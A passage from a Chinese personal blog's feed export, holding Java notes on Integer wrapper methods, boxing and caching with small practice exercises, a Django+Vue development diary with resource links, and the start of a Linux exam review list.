<td>public static Integer valueOf(int i)</td>
<td>返回表示指定的 int 值的 Integer 实例</td>
</tr>
<tr>
<td>public static Integer valueOf(String s)</td>
<td>返回保存指定String值的 Integer 对象</td>
</tr>
<tr>
<td>static string tobinarystring(int i)</td>
<td>得到二进制</td>
</tr>
<tr>
<td>static string tooctalstring(int i)</td>
<td>得到八进制</td>
</tr>
<tr>
<td>static string toHexstring(int i)</td>
<td>得到十六进制</td>
</tr>
<tr>
<td>static int parseInt(string s)</td>
<td>将字符串类型的整数转成int类型的整数</td>
</tr>
</tbody>
</table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//public Integer(int value)：根据 int 值创建 Integer 对象(过时)</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">100</span>);</span><br><span class="line">System.out.println(i1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//public Integer(String s)：根据 String 值创建 Integer 对象(过时)</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="string">&quot;100&quot;</span>);</span><br><span class="line"><span class="comment">//Integer i2 = new Integer(&quot;abc&quot;); //NumberFormatException</span></span><br><span class="line">System.out.println(i2);</span><br><span class="line">System.out.println(<span class="string">&quot;--------&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//public static Integer valueOf(int i)：返回表示指定的 int 值的 Integer 实例</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i3</span> <span class="operator">=</span> Integer.valueOf(<span class="number">100</span>);</span><br><span class="line">System.out.println(i3);</span><br><span class="line"></span><br><span class="line"><span class="comment">//public static Integer valueOf(String s)：返回保存指定String值的Integer对象 </span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i4</span> <span class="operator">=</span> Integer.valueOf(<span class="string">&quot;100&quot;</span>);</span><br><span class="line">System.out.println(i4);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    public static string tobinarystring(int i) 得到二进制</span></span><br><span class="line"><span class="comment">    public static string tooctalstring(int i) 得到八进制</span></span><br><span class="line"><span class="comment">    public static string toHexstring(int i) 得到十六进制</span></span><br><span class="line"><span class="comment">    public static int parseInt(string s) 将字符串类型的整数转成int类型的整数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.把整数转成二进制，十六进制</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> Integer.toBinaryString(<span class="number">100</span>);</span><br><span class="line">System.out.println(str1);<span class="comment">//1100100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.把整数转成八进制</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> Integer.toOctalString(<span class="number">100</span>);</span><br><span class="line">System.out.println(str2);<span class="comment">//144</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.把整数转成十六进制</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> Integer.toHexString(<span class="number">100</span>);</span><br><span class="line">System.out.println(str3);<span class="comment">//64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.将字符串类型的整数转成int类型的整数</span></span><br><span class="line"><span class="comment">//强类型语言:每种数据在java中都有各自的数据类型</span></span><br><span class="line"><span class="comment">//在计算的时候，如果不是同一种数据类型，是无法直接计算的。</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Integer.parseInt(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">System.out.println(i);</span><br><span class="line">System.out.println(i + <span class="number">1</span>);<span class="comment">//124</span></span><br><span class="line"><span class="comment">//细节1:</span></span><br><span class="line"><span class="comment">//在类型转换的时候，括号中的参数只能是数字不能是其他，否则代码会报错</span></span><br><span class="line"><span class="comment">//细节2:</span></span><br><span class="line"><span class="comment">//8种包装类当中，除了Character都有对应的parseXxx的方法，进行类型转换</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;true&quot;</span>;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> Boolean.parseBoolean(str);</span><br><span class="line">System.out.println(b);</span><br></pre></td></tr></table></figure>
<h4 id="装箱与拆箱"><a class="header-anchor" href="#装箱与拆箱">¶</a>装箱与拆箱</h4>
<ul>
<li><strong>基本类型</strong>与<strong>对应的包装类对象</strong>之间，来回转换的过程称为”装箱“与”拆箱“：
<ul>
<li><strong>装箱</strong>：从基本类型转换为对应的包装类对象。</li>
<li><strong>拆箱</strong>：从包装类对象转换为对应的基本类型。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本数值----&gt;包装对象</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">4</span>);<span class="comment">//使用构造函数函数</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">iii</span> <span class="operator">=</span> Integer.valueOf(<span class="number">4</span>);<span class="comment">//使用包装类中的valueOf方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 包装对象----&gt;基本数值</span></span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> i.intValue();</span><br></pre></td></tr></table></figure>
<h4 id="自动装箱与自动拆箱"><a class="header-anchor" href="#自动装箱与自动拆箱">¶</a>自动装箱与自动拆箱</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 经常要做基本类型与包装类之间的转换，从Java 5（JDK 1.5）开始，基本类型与包装类的装箱、拆箱动作可以自动完成</span></span><br><span class="line"></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">4</span>;<span class="comment">//自动装箱。相当于Integer i = Integer.valueOf(4);</span></span><br><span class="line">i = i + <span class="number">5</span>;<span class="comment">//等号右边：将i对象转成基本数值(自动拆箱) i.intValue() + 5;</span></span><br><span class="line"><span class="comment">//加法运算完成后，再次装箱，把基本数值转成对象。</span></span><br></pre></td></tr></table></figure>
<h4 id="基本类型与字符串之间的转换"><a class="header-anchor" href="#基本类型与字符串之间的转换">¶</a>基本类型与字符串之间的转换</h4>
<h5 id="基本类型转换为String"><a class="header-anchor" href="#基本类型转换为String">¶</a>基本类型转换为String</h5>
<ul>
<li>转换方式
<ul>
<li>方式一：直接在数字后加一个空字符串</li>
<li>方式二：通过String类静态方法valueOf()</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntegerDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//int --- String</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//方式1：直接在数字后加一个空字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> number + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//方式2：通过String类静态方法valueOf()</span></span><br><span class="line">        <span class="comment">//public static String valueOf(int i)</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> String.valueOf(number);</span><br><span class="line">        System.out.println(s2);</span><br><span class="line">        System.out.println(<span class="string">&quot;--------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="String转换成基本类型"><a class="header-anchor" href="#String转换成基本类型">¶</a>String转换成基本类型</h5>
<ul>
<li>
<p>除了Character类之外，其他所有包装类都具有parseXxx静态方法可以将字符串参数转换为对应的基本类型</p>
<ul>
<li><code>public static byte parseByte(String s)</code>：将字符串参数转换为对应的byte基本类型。</li>
<li><code>public static short parseShort(String s)</code>：将字符串参数转换为对应的short基本类型。</li>
<li><strong><code>public static int parseInt(String s)</code></strong>：将字符串参数转换为对应的int基本类型。**</li>
<li><strong><code>public static long parseLong(String s)</code></strong>：将字符串参数转换为对应的long基本类型。**</li>
<li><code>public static float parseFloat(String s)</code>：将字符串参数转换为对应的float基本类型。</li>
<li><code>public static double parseDouble(String s)</code>：将字符串参数转换为对应的double基本类型。</li>
<li><code>public static boolean parseBoolean(String s)</code>：将字符串参数转换为对应的boolean基本类型。</li>
</ul>
</li>
<li>
<p>代码使用（仅以Integer类的静态方法parseXxx为例）</p>
<ul>
<li>转换方式
<ul>
<li>方式一：先将字符串数字转成Integer，再调用valueOf()方法</li>
<li>方式二：通过Integer静态方法parseInt()进行转换</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntegerDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//String --- int</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;100&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//方式1：String --valueOf-- Integer --- int</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> Integer.valueOf(s);</span><br><span class="line">        <span class="comment">//public int intValue()</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> i.intValue();</span><br><span class="line">        System.out.println(x);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//方式2</span></span><br><span class="line">        <span class="comment">//public static int parseInt(String s)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> Integer.parseInt(s);</span><br><span class="line">        System.out.println(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意:如果字符串参数的内容无法正确转换为对应的基本类型，则会抛出<code>java.lang.NumberFormatException</code>异常</p>
</blockquote>
<h4 id="底层原理"><a class="header-anchor" href="#底层原理">¶</a>底层原理</h4>
<ul>
<li>建议：获取Integer对象的时候不要自己new，而是采取直接赋值或者静态方法valueOf的方式</li>
<li>因为在实际开发中，-128~127之间的数据，用的比较多。如果每次使用都是new对象，那么太浪费内存了。</li>
<li>所以，提前把这个范围之内的每一个数据都创建好对象，如果要用到了不会创建新的，而是返回已经创建好的对象</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.利用构造方法获取Integer的对象(JDK5以前的方式)</span></span><br><span class="line"><span class="comment">/*Integer i1 = new Integer(1);</span></span><br><span class="line"><span class="comment">        Integer i2 = new Integer(&quot;1&quot;);</span></span><br><span class="line"><span class="comment">        System.out.println(i1);</span></span><br><span class="line"><span class="comment">        System.out.println(i2);*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.利用静态方法获取Integer的对象(JDK5以前的方式)</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i3</span> <span class="operator">=</span> Integer.valueOf(<span class="number">123</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i4</span> <span class="operator">=</span> Integer.valueOf(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i5</span> <span class="operator">=</span> Integer.valueOf(<span class="string">&quot;123&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(i3);</span><br><span class="line">System.out.println(i4);</span><br><span class="line">System.out.println(i5);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.这两种方式获取对象的区别(掌握)</span></span><br><span class="line"><span class="comment">//底层原理：</span></span><br><span class="line"><span class="comment">//因为在实际开发中，-128~127之间的数据，用的比较多。</span></span><br><span class="line"><span class="comment">//如果每次使用都是new对象，那么太浪费内存了</span></span><br><span class="line"><span class="comment">//所以，提前把这个范围之内的每一个数据都创建好对象</span></span><br><span class="line"><span class="comment">//如果要用到了不会创建新的，而是返回已经创建好的对象。</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i6</span> <span class="operator">=</span> Integer.valueOf(<span class="number">127</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i7</span> <span class="operator">=</span> Integer.valueOf(<span class="number">127</span>);</span><br><span class="line">System.out.println(i6 == i7);<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i8</span> <span class="operator">=</span> Integer.valueOf(<span class="number">128</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i9</span> <span class="operator">=</span> Integer.valueOf(<span class="number">128</span>);</span><br><span class="line">System.out.println(i8 == i9);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//因为看到了new关键字，在Java中，每一次new都是创建了一个新的对象</span></span><br><span class="line"><span class="comment">//所以下面的两个对象都是new出来，地址值不一样。</span></span><br><span class="line"><span class="comment">/*		Integer i10 = new Integer(127);</span></span><br><span class="line"><span class="comment">        Integer i11 = new Integer(127);</span></span><br><span class="line"><span class="comment">        System.out.println(i10 == i11);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Integer i12 = new Integer(128);</span></span><br><span class="line"><span class="comment">        Integer i13 = new Integer(128);</span></span><br><span class="line"><span class="comment">        System.out.println(i12 == i13);*/</span></span><br></pre></td></tr></table></figure>
<h3 id="算法小题"><a class="header-anchor" href="#算法小题">¶</a>算法小题</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">练习一</span><br><span class="line">需求：键盘录入一些<span class="number">1</span>~<span class="number">10</span>日之间的整数，并添加到集合中。直到集合中所有数据和超过<span class="number">200</span>为止。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 节选</span></span><br><span class="line">System.out.println(<span class="string">&quot;请输入一个整数&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">numStr</span> <span class="operator">=</span> sc.nextLine();</span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.parseInt(numStr);<span class="comment">//先把异常数据先进行过滤</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.创建一个集合用来添加整数</span></span><br><span class="line">ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//在添加数据的时候触发了自动装箱</span></span><br><span class="line">list.add(num);</span><br><span class="line"><span class="comment">//统计集合中所有的数据和</span></span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> getSum(list);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">练习二</span><br><span class="line">需求：自己实现parseInt方法的效果，将字符串形式的数据转成整数。要求:字符串中只能是数字不能有其他字符最少一位，最多<span class="number">10</span>位, <span class="number">0</span>不能开头</span><br><span class="line">    </span><br><span class="line">		<span class="comment">//1.定义一个字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.校验字符串</span></span><br><span class="line">        <span class="comment">//习惯:会先把异常数据进行过滤，剩下来就是正常的数据。</span></span><br><span class="line">        <span class="keyword">if</span> (!str.matches(<span class="string">&quot;[1-9]\\d&#123;0,9&#125;&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">//错误的数据</span></span><br><span class="line">            System.out.println(<span class="string">&quot;数据格式有误&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//正确的数据</span></span><br><span class="line">            System.out.println(<span class="string">&quot;数据格式正确&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//3.定义一个变量表示最终的结果</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//4.遍历字符串得到里面的每一个字符</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> str.charAt(i) - <span class="string">&#x27;0&#x27;</span>; <span class="comment">//把每一位数字放到number当中</span></span><br><span class="line">                number = number * <span class="number">10</span> + c;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">练习三</span><br><span class="line">需求：定义一个方法自己实现toBinaryString方法的效果，将一个十进制整数转成字符串表示的二进制</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">tobinarystring</span><span class="params">(<span class="type">int</span> number)</span> &#123;<span class="comment">//6</span></span><br><span class="line">        <span class="comment">//核心逻辑:</span></span><br><span class="line">        <span class="comment">//不断的去除以2，得到余数，一直到商为日就结束。</span></span><br><span class="line">        <span class="comment">//还需要把余数倒着拼接起来</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//定义一个StringBuilder用来拼接余数</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="comment">//利用循环不断的除以2获取余数</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (number == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//获取余数 %</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">remaindar</span> <span class="operator">=</span> number % <span class="number">2</span>;<span class="comment">//倒着拼接</span></span><br><span class="line">            sb.insert(<span class="number">0</span>, remaindar);  <span class="comment">// 这里有问题，这一行为什么可以实现倒着拼接？？</span></span><br><span class="line">            <span class="comment">//除以2 /</span></span><br><span class="line">            number = number / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">练习四</span><br><span class="line">需求：请使用代码实现计算你活了多少天，用JDK7和JDK8两种方式完成</span><br><span class="line"></span><br><span class="line"><span class="comment">//请使用代码实现计算你活了多少天，用JDK7和JDK8两种方式完成</span></span><br><span class="line">        <span class="comment">//JDK7</span></span><br><span class="line">        <span class="comment">//规则:只要对时间进行计算或者判断，都需要先获取当前时间的毫秒值</span></span><br><span class="line">        <span class="comment">//1.计算出生年月日的毫秒值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">birthday</span> <span class="operator">=</span> <span class="string">&quot;2000年1月1日&quot;</span>;</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy年MM月dd日&quot;</span>);</span><br><span class="line">        <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> sdf.parse(birthday);</span><br><span class="line">        <span class="type">long</span> <span class="variable">birthdayTime</span> <span class="operator">=</span> date.getTime();</span><br><span class="line">        <span class="comment">//2.获取当前时间的毫秒值</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">todayTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="comment">//3.计算间隔多少天</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> todayTime - birthdayTime;</span><br><span class="line">        System.out.println(time / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//JDK8</span></span><br><span class="line">        <span class="type">LocalDate</span> <span class="variable">ld1</span> <span class="operator">=</span> LocalDate.of(<span class="number">2000</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">LocalDate</span> <span class="variable">ld2</span> <span class="operator">=</span> LocalDate.now();</span><br><span class="line">        <span class="type">long</span> <span class="variable">days</span> <span class="operator">=</span> ChronoUnit.DAYS.between(ld1, ld2);</span><br><span class="line">        System.out.println(days);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">练习五</span><br><span class="line">需求：判断任意的一个年份是闰年还是平年要求:用JDK7和JDK8两种方式判断提示:二月有<span class="number">29</span>天是闰年一年有<span class="number">366</span>天是闰年</span><br><span class="line">    </span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">            判断任意的一个年份是闰年还是平年要求:用JDK7和JDK8两种方式判断提示:</span></span><br><span class="line"><span class="comment">            二月有29天是闰年一年有366天是闰年</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//jdk7</span></span><br><span class="line">        <span class="comment">//我们可以把时间设置为2000年3月1日</span></span><br><span class="line">        <span class="type">Calendar</span> <span class="variable">c</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line">        c.set(<span class="number">2000</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//月份的范围:0~11</span></span><br><span class="line">        <span class="comment">//再把日历往前减一天</span></span><br><span class="line">        c.add(Calendar.DAY_OF_MONTH, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//看当前的时间是28号还是29号?</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">day</span> <span class="operator">=</span> c.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">        System.out.println(day);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//jdk8</span></span><br><span class="line">        <span class="comment">//月份的范围:1~12</span></span><br><span class="line">        <span class="comment">//设定时间为2000年的3月1日</span></span><br><span class="line">        <span class="type">LocalDate</span> <span class="variable">ld</span> <span class="operator">=</span> LocalDate.of(<span class="number">2001</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//把时间往前减一天</span></span><br><span class="line">        <span class="type">LocalDate</span> <span class="variable">ld2</span> <span class="operator">=</span> ld.minusDays(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//获取这一天是一个月中的几号</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">day2</span> <span class="operator">=</span> ld2.getDayOfMonth();</span><br><span class="line">        System.out.println(day2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//true:闰年</span></span><br><span class="line">        <span class="comment">//false:平年</span></span><br><span class="line">        System.out.println(ld.isLeapYear());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>notes</category>
        <category>Java notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>【My0vvn】开发日记</title>
    <url>/2024/09/11/CS_Notes/my0wn/%E3%80%90My0vvn%E3%80%91%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="链接存档"><a class="header-anchor" href="#链接存档">¶</a>链接存档</h3>
<h4 id="前期环境搭建需要"><a class="header-anchor" href="#前期环境搭建需要">¶</a>前期环境搭建需要</h4>
<ul>
<li><a href="https://registry.npmmirror.com/">npm-设置最新的淘宝镜像源</a></li>
<li><a href="https://cn.vuejs.org/">Vue.js - 渐进式 JavaScript 框架</a></li>
</ul>
<h4 id="Django-Vue前后端分离开发"><a class="header-anchor" href="#Django-Vue前后端分离开发">¶</a>Django+Vue前后端分离开发</h4>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/128976272">手把手Django+Vue前后端分离开发入门(附demo) - 知乎 (zhihu.com)</a>  但是好像根据评论区反馈，有点问题，所以仅参考一下</li>
<li>[超详细Django+vue+vscode前后端分离搭建_vue django-CSDN博客](<a href="https://blog.csdn.net/weixin_43883625/article/details/130190149?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=django">https://blog.csdn.net/weixin_43883625/article/details/130190149?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=django</a> + vue&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<sub>all</sub>sobaiduweb~default-2-130190149.142)</li>
</ul>
<h4 id="Django-Vue参考项目"><a class="header-anchor" href="#Django-Vue参考项目">¶</a>Django+Vue参考项目</h4>
<ul>
<li><a href="https://gitee.com/wndw/compete">参考工程-前端</a></li>
<li><a href="https://gitee.com/wndw/paas-compete/tree/master">参考工程-后端</a></li>
</ul>
<h4 id="蓝鲸框架-前后端开发辅助"><a class="header-anchor" href="#蓝鲸框架-前后端开发辅助">¶</a>蓝鲸框架-前后端开发辅助</h4>
<ul>
<li><a href="https://gitee.com/bk_saas/homework_guide/blob/master/5_Django%E5%9F%BA%E7%A1%80%E4%B8%80/%E3%80%8A%E5%A5%96%E9%A1%B9%E7%94%B3%E6%8A%A5%E3%80%8B%E7%AC%AC%E4%B8%80%E6%9C%9F%E5%AE%9E%E6%88%98%E6%89%8B%E5%86%8C.md">蓝鲸-startapp-具体使用示例</a></li>
<li><a href="https://bk.tencent.com/docs/markdown/ZH/PaaS/DevelopTools/BaseGuide/quickstart/python/python_api_example.md">蓝鲸Paas平台-使用蓝鲸云API</a></li>
<li><a href="https://magicbox.bk.tencent.com/static_api/v3/components_vue/2.0/example/index.html#/">MagicBox-Vue2 组件库 | 腾讯蓝鲸智云</a>    蓝鲸-Vue2-组件库+文档</li>
<li><a href="https://github.com/TencentBlueKing/bkpaas-python-sdk/tree/master">蓝鲸 PaaS 平台 Python 工具集 (github.com)</a></li>
<li><a href="https://magicbox.bk.tencent.com/static_api/v3/index.html#start">MagicBox | 腾讯蓝鲸智云-新手起步 (tencent.com)</a></li>
<li><a href="https://bk.tencent.com/s-mart/video?name=%E4%BA%86%E8%A7%A3%E8%93%9D%E9%B2%B8">视频教程｜腾讯蓝鲸智云 (tencent.com)</a>   蓝鲸产品的视频教程</li>
</ul>
<h4 id="开发辅助大模型"><a class="header-anchor" href="#开发辅助大模型">¶</a>开发辅助大模型</h4>
<ul>
<li><a href="https://chatgpt.com/">ChatGPT</a>  但是无法登陆，只能保持离线状态</li>
<li><a href="https://tongyi.aliyun.com/qianwen/">通义千问</a></li>
<li><a href="https://kimi.moonshot.cn/">Kimi</a></li>
</ul>
<h4 id="大模型应用开发"><a class="header-anchor" href="#大模型应用开发">¶</a>大模型应用开发</h4>
<ul>
<li><a href="https://github.com/datawhalechina/llm-universe">面向小白开发者的大模型应用开发教程</a></li>
<li><a href="https://datawhalechina.github.io/llm-universe/#/">动手学大模型应用开发 (datawhalechina.github.io)</a>   在线阅读《动手学大模型应用开发》</li>
<li><a href="https://github.com/datawhalechina/llm-universe/releases/tag/v1">《动手学大模型应用开发》PDF版本下载地址</a></li>
<li><a href="https://aistudio.baidu.com/overview">飞桨AI Studio星河社区-人工智能学习与实训社区 (baidu.com)</a>  新注册的，有免费Token</li>
</ul>
<h3 id="开发日记"><a class="header-anchor" href="#开发日记">¶</a>开发日记</h3>
<h4 id="2024-09-10"><a class="header-anchor" href="#2024-09-10">¶</a>2024-09-10</h4>
<ul>
<li>完成蓝鲸应用新建</li>
<li>完成本地django项目创建+pycharm本地运行环境搭建</li>
<li>完成vue项目创建</li>
<li>完成蓝鲸django开发框架在gitee的推送</li>
</ul>
<h4 id="2024-09-11"><a class="header-anchor" href="#2024-09-11">¶</a>2024-09-11</h4>
<ul>
<li>完成飞桨AI Studio注册、学生认证、Token申请</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>developing notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>MyOwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【saveMyLinux】Linux考前的复习ing</title>
    <url>/2024/08/23/CS_Notes/Linux/%E3%80%90saveMyLinux%E3%80%91Linux%E8%80%83%E5%89%8D%E7%9A%84%E5%A4%8D%E4%B9%A0ing/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>翘佳人的Linux缓考复习伊始</li>
<li>整理一下友友提供的考试形式和范围</li>
<li><a href="https://www.brocademaple.life/2024/07/12/CS_Notes/Linux/%5BsaveMyLinux%5DLinux%E8%AF%BE%E7%A8%8B%E8%A6%81%E7%82%B9%E5%A4%8D%E4%B9%A0/">【saveMyLinux】Linux课程要点复习 | 私の宝庫です (brocademaple.life)</a></li>
</ul>
<h3 id="考点整理（混杂版）"><a class="header-anchor" href="#考点整理（混杂版）">¶</a>考点整理（混杂版）</h3>
<ul>
<li>shell是干什么的</li>
<li>背概念：内核、shell、文件系统</li>
<li>linux人机图形交互ppt   让画两个图
<ul>
<li>进程描述图：父进程、兄进程、弟进程</li>
<li>画进程间的族亲关系   ppt47页</li>
<li>ppt倒数第三页    要求写程序功能</li>
</ul>
</li>
<li>进程管理部分    fork   wait   exit(?)    克隆进程   创建新进程    代码部分画一行要求写这行的作用</li>
<li>中断部分    考了    ppt倒数三页的倒二和倒三（？  上半部和下半部    时间片轮转</li>
<li>ppt57页    io消耗性</li>
